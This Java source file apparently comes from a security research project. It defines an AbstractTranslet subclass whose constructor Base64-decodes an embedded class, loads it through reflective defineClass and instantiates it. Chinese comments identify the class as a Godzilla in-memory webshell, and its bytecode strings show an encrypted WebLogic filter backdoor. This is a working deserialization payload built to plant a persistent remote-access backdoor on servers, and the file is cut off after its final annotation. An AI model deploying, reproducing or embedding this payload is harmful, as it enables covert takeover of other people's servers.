package com.javasec.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class DefineMemshell extends AbstractTranslet {
    public DefineMemshell() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        //哥斯拉内存shell的class Base64
        String godzillaMemShellClassBase64 = "yv66vgAAADQCFwoAigEnCAEoCQB1ASkIASoJAHUBKwoAigEsCQB1AS0JAHUBLgoAFQEvCgB1ATAHATEHATIKAAwBLAgBMwoAEgE0CAE1CAE2BwE3CgASATgKATkBOgcBOwoBOQE8CAE9CgE+AT8KAT4BQAgBQQgApQoAdQFCCgASAUMKAAwBRAgBRQcBRgsAIAFHCwFIAUkLAUgBSgoADAFLCgAoAUwKACgBTQoBTgFPBwFQCgFOAVEIAMUIAMQIAMMKAHUBUgoBUwFUCgAMAVUKAHUBVgoAdQFXCAFYCAFZCADYBwFaCgASAVsLADUBXAgBXQcBXgcBIwoAEgFfCAFgCAFhCAFiCAFjCAFkCADbBwFlCwBCAWYLAEIBZwsAQgFoCQFpAWoIAWsKAWwBbQoAEgFuBwFvCgASAXAKAE0BOgcBcQoAdQFyCgBNAXMIAXQKAXUBdgcBdwoAOQF4CgBSAXkKAXUBegoBdQF7CAF8CgF9AX4KADkBfwoBfQGABwGBCgF9AYIKAFsBgwoAWwGECgA5AYUIAYYIAYcIAYgHAPYIAYkKABIBiggBiwgBjAgBjQgBjggBjwsBkAGRCAGSCAGTCgA5AZQLAZABlQoAdQGWCgB1AZcJAHUBmAoAKAGZCgASAZoHAZsKAHUBJwoAdQGcBwGdCgB4ASwKABUBngoAFQGfBwGgCgB8ASwKAHwBoQoAfAGfCgB1AaIKAHgBZgsBowGkCgA5AaUKAaYBpwoAeAGoCgB1AakKADkBqgsBqwGsCgAVASwHAa0HAa4BAAtpbml0aWFsaXplZAEAAVoBAARsb2NrAQASTGphdmEvbGFuZy9PYmplY3Q7AQAMcGF5bG9hZENsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAANrZXkBABJMamF2YS9sYW5nL1N0cmluZzsBAAhwYXNzd29yZAEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC1MY29tL2phdmFzZWMvbWVtc2hlbGwvV2VibG9naWNGaWx0ZXJNZW1TaGVsbDsBAAZsb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAygpVgEADVN0YWNrTWFwVGFibGUHAZsHATsHATEBABJnZXRDb250ZXh0c0J5TWJlYW4BABUoKVtMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQABagEAAUkBABpnZXRDb21wb25lbnRSdW50aW1lc01ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQARY29tcG9uZW50UnVudGltZXMBABRjb21wb25lbnRSdW50aW1lU2l6ZQEAEGNvbXBvbmVudFJ1bnRpbWUBAAtjaGlsZHJlblNldAEAD0xqYXZhL3V0aWwvU2V0OwEACGl0ZXJhdG9yAQAUTGphdmEvdXRpbC9JdGVyYXRvcjsBABJhcHBsaWNhdGlvblJ1bnRpbWUBAAFpAQAOd2ViYXBwQ29udGV4dHMBABNMamF2YS91dGlsL0hhc2hTZXQ7AQASc2VydmVyUnVudGltZUNsYXNzAQAZd2ViQXBwU2VydmxldENvbnRleHRDbGFzcwEADHRoZU9uZU1ldGhvZAEADXNlcnZlclJ1bnRpbWUBABxnZXRBcHBsaWNhdGlvblJ1bnRpbWVzTWV0aG9kAQATYXBwbGljYXRpb25SdW50aW1lcwEAFmFwcGxpY2F0aW9uUnVudGltZVNpemUHATIHATcHAa8HAUYHAbABAApFeGNlcHRpb25zAQAUZ2V0Q29udGV4dHNCeVRocmVhZHMBAAdyZXF1ZXN0AQARY29ubmVjdGlvbkhhbmRsZXIBAAl3b3JrRW50cnkBAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQALdGhyZWFkQ291bnQBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcBsQcAzAcBUAEAC2dldENvbnRleHRzAQAJYWRkRmlsdGVyAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoBAAp3ZWJDb250ZXh0AQAWZ2V0RmlsdGVyTWFuYWdlck1ldGhvZAEAG2dldFNlcnZsZXRDbGFzc0xvYWRlck1ldGhvZAEAEnNlcnZsZXRDbGFzc0xvYWRlcgEADWZpbHRlck1hbmFnZXIBAA1jYWNoZWRDbGFzc2VzAQAPTGphdmEvdXRpbC9NYXA7AQAUcmVnaXN0ZXJGaWx0ZXJNZXRob2QBABFmaWx0ZXJQYXR0ZXJuTGlzdAEAEExqYXZhL3V0aWwvTGlzdDsBAA5jdXJyZW50TWFwcGluZwEAC2ZpbHRlckNsYXNzAQAEaXNPSwEACGNvbnRleHRzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcA4QEACGdldEZpZWxkAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA29iagEACWZpZWxkTmFtZQEABWNsYXp6AQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7BwFxBwFvAQANZ2V0RmllbGRWYWx1ZQEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQABZgEAA2FlcwEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAltCAQABbQcBsgEAA21kNQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAV4BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABmJhc2U2NAEAAmJzAQAFdmFsdWUBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBswEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABGRhdGEBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAC2NvbnRlbnRUeXBlBwG0BwG1BwG2BwGtBwG3AQAHZGVzdHJveQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABtXZWJsb2dpY0ZpbHRlck1lbVNoZWxsLmphdmEMAJUAlgEAEDNjNmUwYjhhOWMxNTIyNGEMAJIAkwEABHBhc3MMAJQAkwwAlQCeDACOAI8MAIwAjQwBuAG5DADRANIBABNqYXZhL2xhbmcvVGhyb3dhYmxlAQARamF2YS91dGlsL0hhc2hTZXQBAB53ZWJsb2dpYy50My5zcnZyLlNlcnZlclJ1bnRpbWUMAboBuwEALndlYmxvZ2ljLnNlcnZsZXQuaW50ZXJuYWwuV2ViQXBwU2VydmxldENvbnRleHQBAAZ0aGVPbmUBAA9qYXZhL2xhbmcvQ2xhc3MMAbwBvQcBrwwBvgG/AQAQamF2YS9sYW5nL09iamVjdAwBwAHBAQAWZ2V0QXBwbGljYXRpb25SdW50aW1lcwcBwgwBwwHEDAHFAcYBABRnZXRDb21wb25lbnRSdW50aW1lcwwA7gDvDAHHAcgMAckByAEACGNoaWxkcmVuAQANamF2YS91dGlsL1NldAwArwHKBwGwDAHLAcwMAc0BzgwBzwCkDAHQAdEMAdIB0wcBsQwB1AHVAQAQamF2YS9sYW5nL1RocmVhZAwB1gHXDACjAKQHAdgMAdkB2gwB2wHcDADCAKQMANAApAEAEGdldEZpbHRlck1hbmFnZXIBABVnZXRTZXJ2bGV0Q2xhc3NMb2FkZXIBAA1qYXZhL3V0aWwvTWFwDAHdAd4MAd8B4AEADnJlZ2lzdGVyRmlsdGVyAQAQamF2YS9sYW5nL1N0cmluZwwB4QG9AQACLyoBAAdSRVFVRVNUAQAHRk9SV0FSRAEAB0lOQ0xVREUBAAVFUlJPUgEADmphdmEvdXRpbC9MaXN0DAHiAdUMAeMB5AwByQHlBwHmDAHnAegBAA5pbmplY3Qgc3VjY2VzcwcB6QwB6gHrDAHsAe0BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAHuAbkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAwA4wDkDAHFAe8BAANBRVMHAbIMAfAB8QEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAfIB8wwAlQH0DAEHAfUMAfYB9wEAA01ENQcB+AwB8AH5DAH6AdUMAfsB/AEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAH9AfMMAJUB/gwB/wIADAIBAd4BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwCAgHOAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIHAbQMAgMB3gEAC2ludG8gZmlsdGVyAQAhYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDAIEAgUMAgYA+gwBBAEFDADxAPIMAJAAkQwCBwIIDAIJAggBACtjb20vamF2YXNlYy9tZW1zaGVsbC9XZWJsb2dpY0ZpbHRlck1lbVNoZWxsDAIKAgsBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwCDAHIDAH/Ad4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwCDQIODAD5APoHAbUMAg8CEAwCEQISBwITDAIUAesMAhUB8wwA/gD/DAIRAgAHAbYMAQwCFgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQASamF2YS91dGlsL0l0ZXJhdG9yAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABdqYXZhL2xhbmcvcmVmbGVjdC9BcnJheQEACWdldExlbmd0aAEAFShMamF2YS9sYW5nL09iamVjdDspSQEAA2dldAEAJyhMamF2YS9sYW5nL09iamVjdDtJKUxqYXZhL2xhbmcvT2JqZWN0OwEACmlzSW5zdGFuY2UBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAANhZGQBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAB3RvQXJyYXkBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAthY3RpdmVDb3VudAEAAygpSQEACWVudW1lcmF0ZQEAFihbTGphdmEvbGFuZy9UaHJlYWQ7KUkBABBqYXZhL3V0aWwvQXJyYXlzAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwEABmFkZEFsbAEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVoBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQAEc2l6ZQEABnJlbW92ZQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAFihJTGphdmEvbGFuZy9PYmplY3Q7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBAAh0b1N0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQALbmV3SW5zdGFuY2UBAA5nZXRDb250ZW50VHlwZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAMZ2V0UGFyYW1ldGVyAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADmdldENsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEABmVxdWFscwEABmFwcGVuZAEA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";
        //base64 解码
        byte[] classBytes =  Base64.getDecoder().decode(godzillaMemShellClassBase64);
        //获得上下文的ClassLoader
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        //反射获得defineClass方法 用来定义Class
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        //使得defineClass方法可访问
        defineClassMethod.setAccessible(true);
        //调用defineClass方法 从class字节码创建Class
        Class clazz = (Class) defineClassMethod.invoke(loader,classBytes,0,classBytes.length);
        //创建哥斯拉内存shell实例 哥斯拉内存Shell在此处自动注入
        clazz.newInstance();

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
